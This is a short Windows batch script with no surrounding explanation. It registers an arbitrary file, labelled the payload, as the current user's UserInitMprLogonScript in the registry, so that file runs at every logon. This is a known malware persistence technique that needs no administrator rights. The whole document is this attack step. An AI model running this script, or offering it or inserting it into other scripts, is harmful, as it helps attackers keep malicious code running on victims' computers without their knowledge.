set payloadPath=%1
reg add HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%payloadPath%" /f